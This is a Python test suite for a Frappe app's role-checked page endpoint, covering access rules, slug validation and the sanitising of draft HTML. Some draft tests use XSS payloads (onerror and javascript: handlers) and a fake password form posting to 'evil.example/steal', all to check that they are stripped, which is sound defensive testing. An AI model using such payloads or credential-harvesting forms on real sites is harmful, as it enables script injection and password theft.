# Frappe Assistant Core - AI Assistant integration for Frappe Framework
# Copyright (C) 2025 Paul Clinton
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""FAC Page records, the role-checked read endpoint and the host Desk page."""

import glob
import json
import os

import frappe

from frappe_assistant_core.api.fac_page import get_page
from frappe_assistant_core.tests.base_test import BaseAssistantTest

HOST_PAGE = "fac-pages"


def _app_records(kind: str) -> set:
    """Names of the standard DocTypes or Pages this app ships, read from their JSON."""
    names = set()
    for module in frappe.get_module_list("frappe_assistant_core"):
        module_path = frappe.get_app_path("frappe_assistant_core", frappe.scrub(module))
        for path in glob.glob(os.path.join(module_path, kind, "*", "*.json")):
            with open(path) as f:
                record = json.load(f)
            if record.get("doctype") == ("DocType" if kind == "doctype" else "Page"):
                names.add(record["name"])
    return names


class TestFACPage(BaseAssistantTest):
    def _make_page(self, published: int = 1, roles: tuple = (), **overrides) -> str:
        slug = overrides.pop("slug", f"test-page-{frappe.generate_hash(length=8).lower()}")
        doc = frappe.get_doc(
            {
                "doctype": "FAC Page",
                "title": "Team Planner",
                "slug": slug,
                "published": published,
                "roles": [{"role": role} for role in roles],
                "html": '<div class="mk-card">Plan</div>',
                "script": "root_element.querySelector('.mk-card').dataset.ready = '1';",
                "style": ".mk-card { color: red; }",
                **overrides,
            }
        )
        doc.insert(ignore_permissions=True)
        return doc.name

    def _act_as(self, prefix: str, roles: tuple = ()) -> None:
        # Production reaches get_page as the logged-in Desk user; these are such users with exactly
        # the roles the case needs, rolled back with the test transaction.
        user = self.make_throwaway_user(prefix, roles=roles)
        # nosemgrep: frappe-setuser — test acts as a non-Administrator inside the test transaction
        frappe.set_user(user)

    def test_a_listed_role_reads_the_page(self):
        slug = self._make_page(roles=("Report Manager",))
        self._act_as("fac-page-reader", roles=("Report Manager",))

        page = get_page(slug)

        self.assertEqual(page["title"], "Team Planner")
        self.assertEqual(page["html"], '<div class="mk-card">Plan</div>')
        self.assertIn("dataset.ready", page["script"])
        self.assertEqual(page["style"], ".mk-card { color: red; }")

    def test_a_user_without_a_listed_role_is_refused(self):
        slug = self._make_page(roles=("Report Manager",))
        self._act_as("fac-page-outsider", roles=("Workspace Manager",))

        with self.assertRaises(frappe.PermissionError):
            get_page(slug)

    def test_no_roles_means_system_manager_only(self):
        slug = self._make_page(roles=())
        self._act_as("fac-page-no-roles", roles=("Report Manager",))
        with self.assertRaises(frappe.PermissionError):
            get_page(slug)

        self._act_as("fac-page-sysman", roles=("System Manager",))
        self.assertEqual(get_page(slug)["title"], "Team Planner")

    def test_an_unpublished_page_does_not_exist_for_others(self):
        slug = self._make_page(published=0, roles=("Report Manager",))
        self._act_as("fac-page-draft-reader", roles=("Report Manager",))

        with self.assertRaises(frappe.DoesNotExistError) as caught:
            get_page(slug)
        self.assertNotIn("permission", str(caught.exception).lower())

    def test_a_system_manager_reads_an_unpublished_page(self):
        slug = self._make_page(published=0)
        self._act_as("fac-page-draft-sysman", roles=("System Manager",))

        self.assertEqual(get_page(slug)["html"], '<div class="mk-card">Plan</div>')

    def test_a_draft_is_served_without_its_script(self):
        # A draft is dormant, so previewing it must run no code: the script waits for publishing.
        slug = self._make_page(published=0)
        self._act_as("fac-page-draft-preview", roles=("System Manager",))

        page = get_page(slug)

        self.assertEqual(page["script"], "")
        self.assertTrue(page["draft"])
        self.assertEqual(page["html"], '<div class="mk-card">Plan</div>')
        self.assertEqual(page["style"], ".mk-card { color: red; }")

    def test_a_draft_is_served_without_inline_handlers(self):
        # create_shadow_element strips only <script> and <style>, so a draft's html must not carry
        # handlers or javascript: links that would run code in the previewer's session.
        html = (
            '<div class="mk-card">Plan<img src="x" onerror="alert(1)">'
            '<a href="javascript:alert(1)">go</a><meta http-equiv="refresh" content="0"></div>'
        )
        slug = self._make_page(published=0, html=html)
        self._act_as("fac-page-draft-handlers", roles=("System Manager",))

        served = get_page(slug)["html"]

        for unsafe in ("onerror", "javascript:", "<meta", "alert(1)"):
            self.assertNotIn(unsafe, served)
        self.assertIn('class="mk-card"', served)

    def test_a_draft_is_served_without_form_controls(self):
        # Defence in depth behind the sandboxed preview: no fake prompt that posts elsewhere.
        html = (
            '<div class="mk-card"><form action="https://evil.example/steal">'
            '<input type="password" name="p"><select><option>a</option></select>'
            "<textarea></textarea><button>Sign in</button></form></div>"
        )
        slug = self._make_page(published=0, html=html)
        self._act_as("fac-page-draft-form", roles=("System Manager",))

        served = get_page(slug)["html"]

        for tag in ("<form", "<input", "<button", "<select", "<textarea"):
            self.assertNotIn(tag, served)
        self.assertIn('class="mk-card"', served)

    def test_the_host_page_inlines_the_draft_preview(self):
        # Desk loads the page script through Page.load_assets, which resolves the include.
        page = frappe.get_doc("Page", HOST_PAGE)
        page.load_assets()

        self.assertIn("function fac_page_draft_frame", page.script)
        self.assertIn('frame.setAttribute("sandbox", "")', page.script)
        self.assertNotIn("{% include", page.script)

    def test_a_published_page_html_is_served_unchanged(self):
        html = '<div class="mk-card" onclick="go()"><img src="x" onerror="track()"></div>'
        slug = self._make_page(published=1, html=html)
        self._act_as("fac-page-published-html", roles=("System Manager",))

        self.assertEqual(get_page(slug)["html"], html)

    def test_a_published_page_is_served_with_its_script(self):
        slug = self._make_page(published=1)
        self._act_as("fac-page-published-sysman", roles=("System Manager",))

        page = get_page(slug)

        self.assertIn("dataset.ready", page["script"])
        self.assertFalse(page["draft"])

    def test_a_missing_page_does_not_exist(self):
        self._act_as("fac-page-missing", roles=("System Manager",))

        with self.assertRaises(frappe.DoesNotExistError):
            get_page("no-such-page")

    def test_guest_is_refused(self):
        slug = self._make_page(roles=("Guest",))
        # nosemgrep: frappe-setuser — an anonymous request runs as Guest
        frappe.set_user("Guest")

        with self.assertRaises(frappe.PermissionError):
            get_page(slug)

    def test_bad_slugs_are_refused(self):
        for slug in ("Team Planner", "a--b", "-x", "x-", "a" * 81):
            with self.subTest(slug=slug), self.assertRaises(frappe.ValidationError):
                self._make_page(slug=slug)

    def test_page_roles_never_reach_has_role(self):
        # Frappe's Page, Report and Custom HTML Block checks read Has Role by parent name
        # alone, so a Has Role row named after the slug would widen access to any of them.
        slug = self._make_page(roles=("Report Manager",))

        self.assertFalse(frappe.db.exists("Has Role", {"parent": slug}))

    def test_a_long_slug_up_to_the_limit_is_kept(self):
        self.assertEqual(self._make_page(slug="a" * 80), "a" * 80)

    def test_the_slug_cannot_change_after_save(self):
        # The slug names the record, so a changed slug would leave get_page serving the old URL.
        doc = frappe.get_doc("FAC Page", self._make_page())
        doc.slug = "renamed-page"

        with self.assertRaises(frappe.ValidationError):
            doc.save(ignore_permissions=True)

    def test_a_duplicate_slug_is_refused(self):
        self._make_page(slug="team-planner-dup")

        with self.assertRaises(frappe.DuplicateEntryError):
            self._make_page(slug="team-planner-dup")

    def test_the_host_page_is_installed(self):
        self.assertTrue(frappe.db.exists("Page", HOST_PAGE))

    def test_no_desk_page_shares_a_doctype_route(self):
        # Desk resolves /app/<segment> to a readable DocType before any Page, by
        # frappe.router.slug (lower-case, spaces to hyphens), so a Page named like
        # a DocType's slug is unreachable for anyone who can read that DocType.
        doctype_routes = {name.lower().replace(" ", "-") for name in _app_records("doctype")}

        self.assertIn(HOST_PAGE, _app_records("page"))
        self.assertEqual(doctype_routes & _app_records("page"), set())

    def test_only_system_manager_has_doctype_permissions(self):
        roles = {perm.role for perm in frappe.get_meta("FAC Page").permissions}

        self.assertEqual(roles, {"System Manager"})
